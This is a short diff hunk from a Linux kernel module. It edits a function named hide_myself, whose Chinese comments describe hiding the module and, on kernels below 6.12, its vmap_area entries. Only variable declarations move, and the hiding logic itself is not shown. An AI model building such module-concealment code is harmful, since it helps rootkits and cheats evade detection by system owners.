@@ -258,11 +258,11 @@ static int kprobe_do_exit_init(void)
 // 隐藏内核模块
 static void hide_myself(void)
 {
-
+	// 内核模块结构体
+	struct module_use *use, *tmp;
 	// 小于内核 6.12才能隐藏vmap_area_list和_vmap_area_root，高版本移除了这个数据结构，由https://github.com/wenyounb，发现
 #if LINUX_VERSION_CODE < KERNEL_VERSION(6, 12, 0)
 	struct vmap_area *va, *vtmp;
-	struct module_use *use, *tmp;
 	struct list_head *_vmap_area_list;
 	struct rb_root *_vmap_area_root;
 
